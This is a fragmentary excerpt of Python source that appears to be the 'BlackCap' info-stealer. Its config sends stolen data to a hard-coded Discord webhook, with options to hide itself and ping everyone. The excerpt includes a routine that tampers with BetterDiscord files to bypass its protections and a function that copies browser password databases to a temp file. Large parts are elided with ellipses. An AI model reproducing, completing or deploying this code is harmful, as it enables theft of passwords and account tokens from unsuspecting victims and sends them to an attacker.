...
__config__ = {
    'yourwebhookurl': "https://ptb.discord.com/api/webhooks/1103055983275692132/e7l2YWNN0tBr7Vbx_UliNYnKNo0G3_SeBsNAVO3bCMe7Mo0y89bTgRK6j2dR5DpQ0Tau",
    'hide': 'yes',
    'ping': 'yes',
    'pingtype': 'everyone',
    'fake_error':'no',
    ...
    async def bypass_bttdsc(self):
        ...
        if ntpath.exists(bd):
            ...
            with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                txt = f.read()
                content = txt.replace(x, 'blackcap')
                ...
                with open(path, "r", errors="ignore") as ff:
                    ...
                    if not x:
                        ...
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write("blackcap | https://blackcap.ru\n\n")
            ...
            'embeds': [
                {
                    ...
                    'footer': {
                        'text': 'blackcap・https://blackcap.ru'
                    }
                }
            ]
        }
...
def writeforfile(data, name):
    ...
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"blackcap | https://blackcap.ru\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")
...
def getPassw(path, arg):
    ...
    tempfold = temp + "blackcap" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
